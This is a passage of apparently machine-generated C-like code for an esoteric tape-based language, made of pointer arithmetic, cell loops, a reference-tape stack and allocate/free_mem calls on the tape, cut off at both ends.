= tape[ptr];while (tape[ptr]) {ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];ptr-=1;tape[ptr]+=1;ptr+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]+=1;ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];}ptr = ref_tape[--ref_ptr];ptr+=1;while (tape[ptr]) {ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]-=1;}ptr+=1;tape[ptr]-=1;}ptr-=2;tape[ptr]-=1;tape[ptr]+=1;ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];ptr+=3;while (tape[ptr]) {ptr-=3;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]+=1;ptr+=2;tape[ptr]-=1;}ptr-=2;while (tape[ptr]) {ptr+=2;tape[ptr]+=1;ptr-=2;tape[ptr]-=1;}ptr-=1;tape[ptr]+=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];ptr-=1;tape[ptr]+=1;ptr+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]+=1;ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];}ptr = ref_tape[--ref_ptr];ptr+=1;while (tape[ptr]) {ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]-=1;}ptr-=1;tape[ptr]-=1;tape[ptr]-=1;ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];ptr+=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];ptr-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];ptr+=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr-=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]+=1;ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];}ptr = ref_tape[--ref_ptr];ptr+=1;while (tape[ptr]) {ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]-=1;}ptr-=1;tape[ptr]-=1;tape[ptr]+=1;ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];ptr+=3;while (tape[ptr]) {ptr-=3;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]+=1;ptr+=2;tape[ptr]-=1;}ptr-=2;while (tape[ptr]) {ptr+=2;tape[ptr]+=1;ptr-=2;tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];ptr = ref_tape[--ref_ptr];ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr+=3;while (tape[ptr]) {tape[ptr]-=1;}ptr-=4;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {ptr = ref_tape[--ref_ptr];ptr+=4;tape[ptr]+=1;ptr-=3;tape[ptr]+=1;ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];}ptr = ref_tape[--ref_ptr];ptr+=1;while (tape[ptr]) {ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]-=1;}ptr-=1;tape[ptr]-=1;tape[ptr]+=1;ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];ptr+=4;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {ptr = ref_tape[--ref_ptr];ptr-=4;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]+=1;ptr+=3;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];}ptr = ref_tape[--ref_ptr];ptr-=3;while (tape[ptr]) {ptr+=3;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr-=3;tape[ptr]-=1;}ptr-=1;tape[ptr]+=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];ptr-=1;tape[ptr]-=1;ptr+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]+=1;ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];}ptr = ref_tape[--ref_ptr];ptr+=1;while (tape[ptr]) {ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]-=1;}ptr-=1;tape[ptr]-=1;tape[ptr]+=1;ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];ptr+=3;while (tape[ptr]) {ptr-=3;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]+=1;ptr+=2;tape[ptr]-=1;}ptr-=2;while (tape[ptr]) {ptr+=2;tape[ptr]+=1;ptr-=2;tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];ptr = ref_tape[--ref_ptr];tape[ptr]-=1;ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];ptr+=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];ptr-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];ptr+=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr-=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]+=1;ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];}ptr = ref_tape[--ref_ptr];ptr+=1;while (tape[ptr]) {ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]-=1;}ptr-=1;tape[ptr]-=1;tape[ptr]+=1;ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];ptr+=3;while (tape[ptr]) {ptr-=3;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]+=1;ptr+=2;tape[ptr]-=1;}ptr-=2;while (tape[ptr]) {ptr+=2;tape[ptr]+=1;ptr-=2;tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];ptr = ref_tape[--ref_ptr];ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr+=3;while (tape[ptr]) {tape[ptr]-=1;}ptr-=4;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {ptr = ref_tape[--ref_ptr];ptr+=4;tape[ptr]+=1;ptr-=3;tape[ptr]+=1;ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];}ptr = ref_tape[--ref_ptr];ptr+=1;while (tape[ptr]) {ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]-=1;}ptr-=1;tape[ptr]-=1;tape[ptr]+=1;ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];ptr+=4;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {ptr = ref_tape[--ref_ptr];ptr-=4;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]+=1;ptr+=3;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];}ptr = ref_tape[--ref_ptr];ptr-=3;while (tape[ptr]) {ptr+=3;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr-=3;tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];}ptr = ref_tape[--ref_ptr];tape[ptr]-=1;tape[ptr]+=1;ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];ptr+=3;while (tape[ptr]) {ptr-=3;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]+=1;ptr+=2;tape[ptr]-=1;}ptr-=2;while (tape[ptr]) {ptr+=2;tape[ptr]+=1;ptr-=2;tape[ptr]-=1;}ptr-=1;tape[ptr]+=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];ptr-=1;tape[ptr]+=1;ptr+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]+=1;ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];}ptr = ref_tape[--ref_ptr];ptr+=1;while (tape[ptr]) {ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]-=1;}ptr-=1;tape[ptr]-=1;ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr+=3;while (tape[ptr]) {tape[ptr]-=1;}ptr-=4;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {ptr = ref_tape[--ref_ptr];ptr+=4;tape[ptr]+=1;ptr-=3;tape[ptr]+=1;ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];}ptr = ref_tape[--ref_ptr];ptr+=1;while (tape[ptr]) {ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]-=1;}ptr-=1;tape[ptr]-=1;tape[ptr]+=1;ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];ptr+=4;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {ptr = ref_tape[--ref_ptr];ptr-=4;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]+=1;ptr+=3;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];}ptr = ref_tape[--ref_ptr];ptr-=3;while (tape[ptr]) {ptr+=3;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr-=3;tape[ptr]-=1;}ptr-=1;tape[ptr]+=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr] = allocate(tape, ptr, taken_cells);ptr = ref_tape[--ref_ptr];ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];ptr+=1;tape[ptr]+=1;ptr-=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]+=1;ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];}ptr = ref_tape[--ref_ptr];ptr+=1;while (tape[ptr]) {ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]-=1;}ptr-=1;tape[ptr]+=1;ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr+=9;while (tape[ptr]) {tape[ptr]-=1;}ptr-=10;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {ptr = ref_tape[--ref_ptr];ptr+=10;tape[ptr]+=1;ptr-=9;tape[ptr]+=1;ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];}ptr = ref_tape[--ref_ptr];ptr+=1;while (tape[ptr]) {ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]-=1;}ptr-=1;tape[ptr]-=1;tape[ptr]-=1;ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];ptr+=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];ptr-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];ptr+=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr-=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]+=1;ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];}ptr = ref_tape[--ref_ptr];ptr+=1;while (tape[ptr]) {ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]-=1;}ptr-=1;tape[ptr]-=1;tape[ptr]-=1;tape[ptr]+=1;ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];ptr+=10;while (tape[ptr]) {ptr-=10;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]+=1;ptr+=9;tape[ptr]-=1;}ptr-=9;while (tape[ptr]) {ptr+=9;tape[ptr]+=1;ptr-=9;tape[ptr]-=1;}while (tape[ptr]) {tape[ptr]-=1;}ptr+=3;while (tape[ptr]) {tape[ptr]-=1;}ptr-=4;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {ptr = ref_tape[--ref_ptr];ptr+=4;tape[ptr]+=1;ptr-=3;tape[ptr]+=1;ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];}ptr = ref_tape[--ref_ptr];ptr+=1;while (tape[ptr]) {ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]-=1;}ptr-=1;tape[ptr]-=1;tape[ptr]+=1;ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];ptr+=4;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {ptr = ref_tape[--ref_ptr];ptr-=4;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]+=1;ptr+=3;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];}ptr = ref_tape[--ref_ptr];ptr-=3;while (tape[ptr]) {ptr+=3;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr-=3;tape[ptr]-=1;}ptr-=1;tape[ptr]+=1;ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];ptr+=10;while (tape[ptr]) {ptr-=10;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]+=1;ptr+=9;tape[ptr]-=1;}ptr-=9;while (tape[ptr]) {ptr+=9;tape[ptr]+=1;ptr-=9;tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];free_mem(tape, ptr, taken_cells);while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];tape[ptr]-=1;tape[ptr]+=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr] = allocate(tape, ptr, taken_cells);ptr = ref_tape[--ref_ptr];ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];ptr+=1;tape[ptr]+=1;ptr-=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]+=1;ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];}ptr = ref_tape[--ref_ptr];ptr+=1;while (tape[ptr]) {ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]-=1;}ptr-=1;tape[ptr]+=1;ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr+=6;while (tape[ptr]) {tape[ptr]-=1;}ptr-=7;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {ptr = ref_tape[--ref_ptr];ptr+=7;tape[ptr]+=1;ptr-=6;tape[ptr]+=1;ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];}ptr = ref_tape[--ref_ptr];ptr+=1;while (tape[ptr]) {ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]-=1;}ptr-=1;tape[ptr]-=1;tape[ptr]-=1;ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];ptr+=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];ptr-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];ptr+=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr-=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]+=1;ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];}ptr = ref_tape[--ref_ptr];ptr+=1;while (tape[ptr]) {ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]-=1;}ptr-=1;tape[ptr]-=1;tape[ptr]-=1;ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr+=2;while (tape[ptr]) {tape[ptr]-=1;}ptr-=3;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {ptr = ref_tape[--ref_ptr];ptr+=3;tape[ptr]+=1;ptr-=2;tape[ptr]+=1;ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];}ptr = ref_tape[--ref_ptr];ptr+=1;while (tape[ptr]) {ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]-=1;}ptr-=1;tape[ptr]-=1;tape[ptr]+=1;ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];ptr+=7;while (tape[ptr]) {ptr-=7;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]+=1;ptr+=6;tape[ptr]-=1;}ptr-=6;while (tape[ptr]) {ptr+=6;tape[ptr]+=1;ptr-=6;tape[ptr]-=1;}while (tape[ptr]) {tape[ptr]-=1;}ptr+=3;while (tape[ptr]) {tape[ptr]-=1;}ptr-=4;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {ptr = ref_tape[--ref_ptr];ptr+=4;tape[ptr]+=1;ptr-=3;tape[ptr]+=1;ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];}ptr = ref_tape[--ref_ptr];ptr+=1;while (tape[ptr]) {ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]-=1;}ptr-=1;tape[ptr]-=1;tape[ptr]+=1;ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];ptr+=4;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {ptr = ref_tape[--ref_ptr];ptr-=4;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]+=1;ptr+=3;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];}ptr = ref_tape[--ref_ptr];ptr-=3;while (tape[ptr]) {ptr+=3;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr-=3;tape[ptr]-=1;}ptr-=1;tape[ptr]+=1;ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];ptr+=7;while (tape[ptr]) {ptr-=7;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]+=1;ptr+=6;tape[ptr]-=1;}ptr-=6;while (tape[ptr]) {ptr+=6;tape[ptr]+=1;ptr-=6;tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];free_mem(tape, ptr, taken_cells);while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];tape[ptr]-=1;ptr+=7;while (tape[ptr]) {tape[ptr]-=1;}ptr-=7;tape[ptr]+=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr] = allocate(tape, ptr, taken_cells);ptr = 